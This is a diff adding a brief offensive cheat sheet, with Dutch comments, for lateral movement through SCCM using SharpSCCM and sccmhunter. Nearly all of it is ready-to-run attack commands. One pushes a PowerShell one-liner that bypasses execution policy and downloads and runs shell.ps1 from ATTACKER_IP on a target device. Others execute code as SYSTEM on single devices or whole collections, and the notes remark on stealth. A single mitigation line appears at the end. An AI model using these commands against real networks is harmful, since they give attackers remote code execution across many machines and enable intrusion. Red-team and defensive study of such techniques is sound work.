@@ -1,0 +1,26 @@
+# SCCM Deployment — Lateral movement via SCCM applicatie/script
+# Gebruik SCCM infrastructuur om code uit te voeren op managed clients
+#
+# === Vereisten ===
+# - SCCM Admin rechten (Full Administrator of Application Author)
+# - Toegang tot SMS Provider
+#
+# === Voorbeelden ===
+
+# SharpSCCM - Script deployment naar specifiek device
+.\SharpSCCM.exe exec -d TARGET_DEVICE -p 'powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString(\"http://ATTACKER_IP/shell.ps1\")' -sms SMS_SERVER -sc SITECODE
+
+# SharpSCCM - Applicatie deployment
+.\SharpSCCM.exe exec -d TARGET_DEVICE -a "C:\Windows\System32\cmd.exe /c whoami > C:\temp\out.txt" -sms SMS_SERVER -sc SITECODE
+
+# sccmhunter - Admin commando uitvoeren
+python3 sccmhunter.py admin -u ADMIN -p 'PASS' -d DOMAIN -dc-ip DC_IP
+# > exec TARGET_DEVICE whoami
+
+# Naar alle devices in een collection
+.\SharpSCCM.exe exec -c COLLECTION_ID -p 'whoami' -sms SMS_SERVER -sc SITECODE
+
+# Noot: SCCM deployments draaien als SYSTEM op de client
+# Noot: Deployment verschijnt in SCCM logs — niet volledig stealthy
+# Noot: Kan breed ingezet worden (hele collecties van machines)
+# Noot: Mitigatie: Beperk SCCM admin rechten, monitor deployments
